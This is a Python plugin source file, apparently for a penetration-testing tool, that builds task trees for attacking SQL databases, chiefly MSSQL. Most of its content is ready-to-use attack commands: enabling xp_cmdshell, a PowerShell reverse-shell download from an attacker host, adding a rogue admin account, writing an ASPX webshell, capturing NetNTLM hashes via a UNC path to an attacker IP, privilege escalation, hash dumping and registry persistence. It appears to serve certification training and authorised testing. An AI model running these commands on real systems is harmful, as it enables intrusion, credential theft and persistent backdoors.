"""
SQL database service enumeration plugin (MySQL, PostgreSQL, MSSQL)
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SQLPlugin(ServicePlugin):
    """SQL database enumeration plugin"""

    @property
    def name(self) -> str:
        return "sql"

    @property
    def default_ports(self) -> List[int]:
        return [1433, 3306, 5432, 1521]

    @property
    def service_names(self) -> List[str]:
        return ['mysql', 'postgresql', 'postgres', 'ms-sql', 'mssql', 'oracle']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        if any(svc in service for svc in self.service_names):
            return True

        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        version = service_info.get('version', '')
        service = service_info.get('service', '').lower()

        # Determine database type
        if 'mysql' in service or port == 3306:
            db_type = 'mysql'
            connect_cmd = f'mysql -h {target} -P {port} -u root'
        elif 'postgres' in service or port == 5432:
            db_type = 'postgresql'
            connect_cmd = f'psql -h {target} -p {port} -U postgres'
        elif 'mssql' in service or 'ms-sql' in service or port == 1433:
            db_type = 'mssql'
            connect_cmd = f'impacket-mssqlclient {target} -port {port}'
        else:
            db_type = 'generic'
            connect_cmd = f'# Database-specific client needed'

        tasks = {
            'id': f'sql-enum-{port}',
            'name': f'{db_type.upper()} Enumeration (Port {port})',
            'type': 'parent',
            'children': [
                {
                    'id': f'sql-version-{port}',
                    'name': 'Version Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap --script {db_type}-info -p{port} {target}',
                        'description': f'Gather {db_type} version and configuration info',
                        'tags': ['OSCP:MEDIUM']
                    }
                },
                {
                    'id': f'sql-anon-{port}',
                    'name': 'Test Anonymous/Default Access',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Try connecting without password or with defaults',
                        'command': connect_cmd,
                        'tags': ['MANUAL', 'OSCP:HIGH', 'QUICK_WIN'],
                        'notes': [
                            'Try default credentials: root:<blank>, admin:admin, sa:<blank>',
                            'If access gained, enumerate databases and tables',
                            'Look for credentials in application databases'
                        ]
                    }
                }
            ]
        }

        if version:
            tasks['children'].append({
                'id': f'searchsploit-sql-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'command',
                'metadata': {
                    'command': f'searchsploit {version}',
                    'description': f'Search for {db_type} exploits',
                    'tags': ['RESEARCH', 'OSCP:MEDIUM']
                }
            })

        # Database-specific enumeration - MSSQL comprehensive techniques
        if db_type == 'mssql':
            mssql_tasks = self._get_mssql_tasks(target, port, version)
            tasks['children'].extend(mssql_tasks)

        return tasks

    def _get_mssql_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate comprehensive MSSQL enumeration and exploitation tasks"""
        mssql_tasks = []

        # 1. Automated Enumeration
        mssql_tasks.append({
            'id': f'mssql-nmap-enum-{port}',
            'name': 'Automated MSSQL Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess -p{port} {target}',
                'description': 'Comprehensive MSSQL enumeration via NSE scripts',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    '--script ms-sql-info': 'Gather version and instance information',
                    'ms-sql-empty-password': 'Test for accounts with blank passwords',
                    'ms-sql-config': 'Enumerate server configuration',
                    'ms-sql-ntlm-info': 'Extract Windows/domain information via NTLM',
                    'ms-sql-tables': 'List databases and tables (if authenticated)',
                    'ms-sql-hasdbaccess': 'Check accessible databases'
                },
                'success_indicators': [
                    'Version and instance name retrieved',
                    'Blank password accounts found',
                    'Database names enumerated',
                    'NTLM domain information leaked'
                ],
                'failure_indicators': [
                    'All scripts timeout (firewall blocking)',
                    'Authentication required for all checks',
                    'Access denied errors'
                ],
                'next_steps': [
                    'Try default credentials: sa (blank), sa:sa, MSSQLSERVER (blank)',
                    'Attempt NetNTLM hash capture if NTLM auth detected',
                    'Research version-specific exploits if version identified'
                ],
                'alternatives': [
                    f'impacket-mssqlclient {target} -port {port} -windows-auth (manual connection)',
                    'Metasploit: auxiliary/scanner/mssql/mssql_ping',
                    'Manual: sqsh -S {target}:{port} -U sa -P ""'
                ],
                'notes': 'MSSQL often reveals domain info via NTLM - valuable for AD attacks'
            }
        })

        # 2. xp_cmdshell RCE (Primary Attack Vector)
        mssql_tasks.append({
            'id': f'mssql-xp-cmdshell-{port}',
            'name': 'xp_cmdshell Command Execution',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-xp-check-{port}',
                    'name': 'Check xp_cmdshell Status',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Determine if xp_cmdshell is enabled and accessible',
                        'command': "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';",
                        'tags': ['MANUAL', 'OSCP:HIGH', 'QUICK_WIN'],
                        'notes': 'Run via impacket-mssqlclient or authenticated SQL connection. Check value_in_use: 1=enabled, 0=disabled. Even if disabled, you may have permissions to enable it.'
                    }
                },
                {
                    'id': f'mssql-xp-enable-{port}',
                    'name': 'Enable xp_cmdshell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enable xp_cmdshell for RCE (requires sysadmin or elevated privileges)',
                        'command': "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                        'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            'sp_configure': 'System stored procedure to change server configuration',
                            'Show Advanced Options': 'Must be enabled first to access xp_cmdshell setting',
                            'RECONFIGURE': 'Apply configuration changes immediately',
                            'xp_cmdshell': 'Extended stored procedure for OS command execution'
                        },
                        'success_indicators': [
                            'Configuration option changed',
                            'RECONFIGURE completed successfully',
                            'xp_cmdshell returns command output'
                        ],
                        'failure_indicators': [
                            'Access denied (need sysadmin or CONTROL SERVER permission)',
                            'User does not have permission to execute sp_configure'
                        ],
                        'next_steps': [
                            'Test with: EXEC xp_cmdshell "whoami"',
                            'Get reverse shell: EXEC xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString(\\\"http://<LHOST>/rev.ps1\\\")"',
                            'Check service account context (often NT SERVICE\\MSSQL$ or domain account)'
                        ],
                        'alternatives': [
                            'If xp_cmdshell fails, try sp_OACreate/sp_OAMethod for RCE',
                            'Python/R external scripts: sp_execute_external_script',
                            'CLR assemblies (advanced, requires dbo)',
                            'SQL Agent jobs (if Agent service running)'
                        ],
                        'notes': 'xp_cmdshell is the #1 MSSQL RCE method for OSCP. Service account often has SeImpersonatePrivilege → use JuicyPotato/PrintSpoofer for SYSTEM.'
                    }
                },
                {
                    'id': f'mssql-xp-rce-{port}',
                    'name': 'Execute Commands via xp_cmdshell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE via xp_cmdshell (once enabled)',
                        'command': f'crackmapexec mssql {target} -u USERNAME -p PASSWORD -x "whoami"',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '-x': 'Execute CMD command via xp_cmdshell',
                            '-X': 'Execute PowerShell command (use for reverse shells)'
                        },
                        'alternatives': [
                            f'impacket-mssqlclient {target} -port {port} -windows-auth → enable_xp_cmdshell → xp_cmdshell whoami',
                            'Manual SQL: EXEC xp_cmdshell "net user hacker P@ssw0rd! /add"',
                            'Bypass blacklist: DECLARE @x VARCHAR(100)=\'xp_cmdshell\'; EXEC @x \'whoami\''
                        ],
                        'notes': 'Get PowerShell reverse shell → enumerate for privesc (SeImpersonate, stored creds, other services)'
                    }
                }
            ]
        })

        # 3. Privilege Escalation Techniques
        mssql_tasks.append({
            'id': f'mssql-privesc-{port}',
            'name': 'MSSQL Privilege Escalation',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-impersonate-{port}',
                    'name': 'IMPERSONATE Privilege Escalation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escalate by impersonating higher-privileged users (sa, sysadmin)',
                        'command': "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
                        'tags': ['MANUAL', 'OSCP:HIGH', 'PRIVESC'],
                        'flag_explanations': {
                            'IMPERSONATE permission': 'Allows executing queries as another user/login',
                            'sys.server_permissions': 'System table listing all permission grants',
                            'grantor_principal_id': 'User who granted the permission (target for impersonation)'
                        },
                        'success_indicators': [
                            'sa or other sysadmin user listed',
                            'High-privileged service accounts listed',
                            'After EXECUTE AS LOGIN: IS_SRVROLEMEMBER(\'sysadmin\') returns 1'
                        ],
                        'failure_indicators': [
                            'No users returned (IMPERSONATE not granted)',
                            'Only low-privileged users available'
                        ],
                        'next_steps': [
                            'Execute: EXECUTE AS LOGIN = \'sa\'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(\'sysadmin\');',
                            'If now sysadmin: enable xp_cmdshell, create new admin user, extract hashes',
                            'Check impersonated user access to linked servers',
                            'Revert context: REVERT'
                        ],
                        'alternatives': [
                            'Metasploit: auxiliary/admin/mssql/mssql_escalate_execute_as',
                            'PowerUpSQL: Invoke-SQLAuditPrivImpersonateLogin',
                            'Manual: Test each user with EXECUTE AS LOGIN'
                        ],
                        'notes': 'IMPERSONATE is commonly granted for application accounts. Check linked servers after impersonating - may have more access chains.'
                    }
                },
                {
                    'id': f'mssql-dbowner-{port}',
                    'name': 'db_owner to sysadmin Escalation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escalate from db_owner role to sysadmin if database is trustworthy and owned by sa',
                        'command': "SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name WHERE b.is_trustworthy_on=1;",
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'PRIVESC'],
                        'flag_explanations': {
                            'is_trustworthy_on': 'Allows stored procedures in DB to access outside resources',
                            'db_owner role': 'Full control over specific database',
                            'EXECUTE AS OWNER': 'Stored procedure runs with permissions of DB owner (often sa)'
                        },
                        'success_indicators': [
                            'Trustworthy database found where you have db_owner role',
                            'Database owner is sa or sysadmin',
                            'After executing stored procedure: sysadmin role granted'
                        ],
                        'next_steps': [
                            'Check your roles: USE <trustworthy_db>; SELECT USER_NAME();',
                            'Create privesc stored procedure: CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember \'youruser\',\'sysadmin\'',
                            'Execute: EXEC sp_elevate',
                            'Verify: SELECT IS_SRVROLEMEMBER(\'sysadmin\')'
                        ],
                        'alternatives': [
                            'Metasploit: auxiliary/admin/mssql/mssql_escalate_dbowner',
                            'PowerUpSQL: Invoke-SQLEscalatePriv -Priv db_owner'
                        ],
                        'notes': 'Trustworthy databases are rare but powerful. msdb is often trustworthy by default in older versions.'
                    }
                }
            ]
        })

        # 4. Linked Server Attacks
        mssql_tasks.append({
            'id': f'mssql-linked-servers-{port}',
            'name': 'Linked Server Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-enum-links-{port}',
                    'name': 'Enumerate Linked Servers',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Discover linked MSSQL servers for lateral movement',
                        'command': "EXEC sp_linkedservers; SELECT * FROM sys.servers WHERE is_linked = 1;",
                        'tags': ['MANUAL', 'OSCP:HIGH', 'ENUM'],
                        'success_indicators': [
                            'Linked servers discovered',
                            'Server names and providers listed',
                            'Credentials stored for links (may be visible to sysadmin)'
                        ],
                        'next_steps': [
                            'Test access: SELECT * FROM OPENQUERY([LINKED_SERVER], \'SELECT SYSTEM_USER\')',
                            'Check if you can execute commands on linked server',
                            'Chain links: Server A → Server B → Server C (link crawling)',
                            'Check for RPC OUT enabled: EXEC sp_serveroption @server=\'LINKED\', @optname=\'rpc out\', @optvalue=\'true\''
                        ],
                        'alternatives': [
                            'Metasploit: exploit/windows/mssql/mssql_linkcrawler',
                            'PowerUpSQL: Get-SQLServerLinkCrawl -Instance <server>',
                            'impacket-mssqlclient: enum_links, use_link [NAME]'
                        ],
                        'notes': 'Linked servers often use high-privileged service accounts. Can chain multiple links for domain lateral movement.'
                    }
                },
                {
                    'id': f'mssql-linked-rce-{port}',
                    'name': 'RCE via Linked Servers',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute commands on linked servers (if xp_cmdshell enabled remotely)',
                        'command': "EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [LINKED_SERVER]') AT [INTERMEDIATE_SERVER]",
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'EXPLOIT'],
                        'notes': 'Nested OPENQUERY/EXEC for multi-hop RCE. Enable xp_cmdshell on target: EXEC (\'sp_configure \'\'xp_cmdshell\'\', 1; RECONFIGURE\') AT [LINKED]'
                    }
                }
            ]
        })

        # 5. Credential Theft
        mssql_tasks.append({
            'id': f'mssql-cred-theft-{port}',
            'name': 'Credential and Hash Extraction',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-hash-dump-{port}',
                    'name': 'Dump Password Hashes',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract MSSQL user password hashes (requires sysadmin)',
                        'command': "SELECT name, password_hash FROM master.sys.sql_logins;",
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'CREDS'],
                        'success_indicators': [
                            'Password hashes retrieved for SQL logins',
                            'Hashes in hashcat format (mode 1731 for MSSQL 2012+)'
                        ],
                        'next_steps': [
                            'Crack hashes: hashcat -m 1731 hashes.txt wordlist.txt',
                            'Metasploit: auxiliary/scanner/mssql/mssql_hashdump'
                        ],
                        'alternatives': [
                            'Metasploit: auxiliary/scanner/mssql/mssql_hashdump',
                            'impacket-mssqlclient built-in commands'
                        ],
                        'notes': 'MSSQL hashes are SHA-512 based. Cracking difficult but possible with good wordlists.'
                    }
                },
                {
                    'id': f'mssql-ntlm-steal-{port}',
                    'name': 'Steal NetNTLM Hash via UNC Path',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Force MSSQL service account to authenticate to attacker SMB server, capturing NetNTLM hash',
                        'command': f"EXEC xp_dirtree '\\\\\\\\<ATTACKER_IP>\\\\share';",
                        'tags': ['MANUAL', 'OSCP:HIGH', 'CREDS', 'QUICK_WIN'],
                        'flag_explanations': {
                            'xp_dirtree': 'Extended stored procedure to list directory tree (triggers SMB auth)',
                            'UNC path': 'Network path that forces NTLM authentication to attacker',
                            'xp_subdirs, xp_fileexist': 'Alternative procedures with same effect'
                        },
                        'success_indicators': [
                            'Responder/impacket-smbserver captures NetNTLMv2 hash',
                            'Hash format: username::domain:challenge:response',
                            'Service account name revealed (often domain account)'
                        ],
                        'failure_indicators': [
                            'Outbound SMB blocked by firewall',
                            'No hash captured (may need to check permissions: EXEC sp_helprotect \'xp_dirtree\')'
                        ],
                        'next_steps': [
                            'Setup listener: sudo responder -I tun0 OR sudo impacket-smbserver share ./ -smb2support',
                            'Execute SQL command to trigger auth',
                            'Crack hash: hashcat -m 5600 hash.txt wordlist.txt',
                            'Or relay hash: impacket-ntlmrelayx -tf targets.txt -smb2support'
                        ],
                        'alternatives': [
                            'EXEC master..xp_subdirs \'\\\\\\\\<ATTACKER>\\\\share\'',
                            'EXEC master..xp_fileexist \'\\\\\\\\<ATTACKER>\\\\share\\\\file.txt\'',
                            'Metasploit: auxiliary/admin/mssql/mssql_ntlm_stealer'
                        ],
                        'notes': 'MSSQL service accounts are often domain accounts with elevated privileges. Hash relay may work better than cracking. Check who has permission to run xp_dirtree: Use master; EXEC sp_helprotect \'xp_dirtree\';'
                    }
                }
            ]
        })

        # 6. File Operations
        mssql_tasks.append({
            'id': f'mssql-file-ops-{port}',
            'name': 'File Read/Write Operations',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-read-file-{port}',
                    'name': 'Read Files with OPENROWSET',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read files from OS filesystem (requires ADMINISTER BULK OPERATIONS permission)',
                        'command': "SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;",
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'ENUM'],
                        'flag_explanations': {
                            'OPENROWSET': 'Function to query external data sources including files',
                            'BULK': 'Read file as binary/text blob',
                            'SINGLE_CLOB': 'Return entire file as single character large object',
                            'N prefix': 'Unicode string literal'
                        },
                        'success_indicators': [
                            'File contents displayed in query results',
                            'Sensitive data extracted (web.config, SAM, etc.)'
                        ],
                        'failure_indicators': [
                            'Permission denied (need ADMINISTER BULK OPERATIONS)',
                            'File not found or access denied by OS permissions'
                        ],
                        'next_steps': [
                            'Check permission: SELECT * FROM fn_my_permissions(NULL, \'SERVER\') WHERE permission_name LIKE \'%BULK%\'',
                            'Read web.config: OPENROWSET(BULK \'C:/inetpub/wwwroot/web.config\', SINGLE_CLOB)',
                            'Read SSH keys, database backup files, application configs'
                        ],
                        'alternatives': [
                            'xp_cmdshell type C:\\file.txt (if command exec available)',
                            'Error-based SQLi: id=1+and+1=(select+x+from+OpenRowset(BULK+\'C:\\Windows\\win.ini\',SINGLE_CLOB)+R(x))--'
                        ],
                        'notes': 'BULK operations common in data import roles. Check current user permissions first.'
                    }
                },
                {
                    'id': f'mssql-write-file-{port}',
                    'name': 'Write Files with Ole Automation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Write files to disk (webshell, backdoor) - requires admin and Ole Automation enabled',
                        'command': "sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @OLE INT, @FileID INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT; EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\shell.aspx', 8, 1; EXEC sp_OAMethod @FileID, 'WriteLine', Null, '<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>'; EXEC sp_OADestroy @FileID; EXEC sp_OADestroy @OLE;",
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'Ole Automation Procedures': 'COM object interaction from SQL (disabled by default)',
                            'sp_OACreate': 'Create COM object (FileSystemObject for file access)',
                            'sp_OAMethod': 'Call method on COM object (OpenTextFile, WriteLine)',
                            'OpenTextFile mode 8': 'Append mode (create if not exists)',
                            'sp_OADestroy': 'Clean up COM objects'
                        },
                        'success_indicators': [
                            'File created on disk',
                            'Webshell accessible via browser',
                            'RCE via webshell cmd parameter'
                        ],
                        'next_steps': [
                            'Access webshell: http://{target}/shell.aspx?cmd=whoami',
                            'Upload full reverse shell or payload',
                            'Common writable paths: C:\\inetpub\\wwwroot, C:\\xampp\\htdocs, C:\\wamp\\www'
                        ],
                        'alternatives': [
                            'xp_cmdshell echo ^<%%@ ... %^> > C:\\inetpub\\wwwroot\\shell.aspx',
                            'BCP utility to export query results as files',
                            'PowerShell download via xp_cmdshell'
                        ],
                        'notes': 'Ole Automation requires sysadmin. Alternative: use xp_cmdshell to write files if already enabled.'
                    }
                }
            ]
        })

        # 7. Advanced RCE Methods
        mssql_tasks.append({
            'id': f'mssql-advanced-rce-{port}',
            'name': 'Alternative RCE Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'mssql-python-rce-{port}',
                    'name': 'RCE via Python External Scripts',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute Python code if external scripts enabled (runs as different service account)',
                        'command': "EXECUTE sp_execute_external_script @language = N'Python', @script = N'import os; os.system(\"whoami\")';",
                        'tags': ['MANUAL', 'OSCP:LOW', 'EXPLOIT'],
                        'notes': 'Requires "external scripts enabled" config and Python installed. Check: SELECT * FROM sys.configurations WHERE name = \'external scripts enabled\'. Alternative to xp_cmdshell with different execution context.'
                    }
                },
                {
                    'id': f'mssql-agent-jobs-{port}',
                    'name': 'RCE via SQL Server Agent Jobs',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create scheduled job to execute commands (requires SQL Agent service running)',
                        'tags': ['MANUAL', 'OSCP:LOW', 'EXPLOIT'],
                        'notes': 'SQL Agent jobs run as SQL Server Agent service account. Can execute CmdExec, PowerShell, or SSIS steps. Useful when xp_cmdshell blocked. Check if Agent running: EXEC master.dbo.xp_servicecontrol \'QueryState\',\'SQLServerAGENT\''
                    }
                },
                {
                    'id': f'mssql-registry-{port}',
                    'name': 'Windows Registry Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read/write Windows registry for persistence or enumeration',
                        'command': "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName';",
                        'tags': ['MANUAL', 'OSCP:LOW', 'ENUM'],
                        'flag_explanations': {
                            'xp_regread': 'Read registry value',
                            'xp_regwrite': 'Write registry value (requires elevated perms)',
                            'xp_instance_reg*': 'Instance-aware registry functions'
                        },
                        'notes': 'Extract system information, stored credentials, installed software. Persistence: write to Run keys. Check permissions: EXEC sp_helprotect \'xp_regread\''
                    }
                }
            ]
        })

        # 8. Metasploit Modules Reference
        mssql_tasks.append({
            'id': f'mssql-metasploit-{port}',
            'name': 'Metasploit MSSQL Modules',
            'type': 'manual',
            'metadata': {
                'description': 'Metasploit modules for automated MSSQL exploitation',
                'tags': ['AUTOMATED', 'OSCP:MEDIUM'],
                'notes': [
                    'auxiliary/scanner/mssql/mssql_ping - Discover instances',
                    'auxiliary/admin/mssql/mssql_enum - Enumerate server config',
                    'auxiliary/admin/mssql/mssql_enum_sql_logins - Enum SQL logins',
                    'auxiliary/admin/mssql/mssql_escalate_execute_as - IMPERSONATE privesc',
                    'auxiliary/admin/mssql/mssql_escalate_dbowner - db_owner privesc',
                    'auxiliary/admin/mssql/mssql_exec - Execute commands via xp_cmdshell',
                    'auxiliary/admin/mssql/mssql_ntlm_stealer - Steal NetNTLM hash',
                    'auxiliary/scanner/mssql/mssql_hashdump - Dump password hashes',
                    'exploit/windows/mssql/mssql_linkcrawler - Crawl linked servers',
                    'exploit/windows/mssql/mssql_payload - Upload and execute payload',
                    'Note: Set USERNAME, PASSWORD, RHOSTS, RPORT, and USE_WINDOWS_AUTHENT if domain auth'
                ]
            }
        })

        return mssql_tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        new_tasks = []

        # If anonymous access succeeds, add database enumeration
        if 'anon' in task_id and 'connected' in result.lower():
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'db-enum-{port}',
                'name': 'Database Enumeration',
                'type': 'manual',
                'metadata': {
                    'description': 'Enumerate databases, tables, and extract data',
                    'tags': ['MANUAL', 'OSCP:HIGH'],
                    'notes': [
                        'SHOW DATABASES; or \\l (postgres)',
                        'USE <database>; SELECT * FROM users;',
                        'Look for password hashes, API keys, credentials'
                    ]
                }
            })

        return new_tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        return [
            'Manual connection with database client',
            'SQL injection if web app connects to this database',
            'Metasploit auxiliary modules for each DB type'
        ]
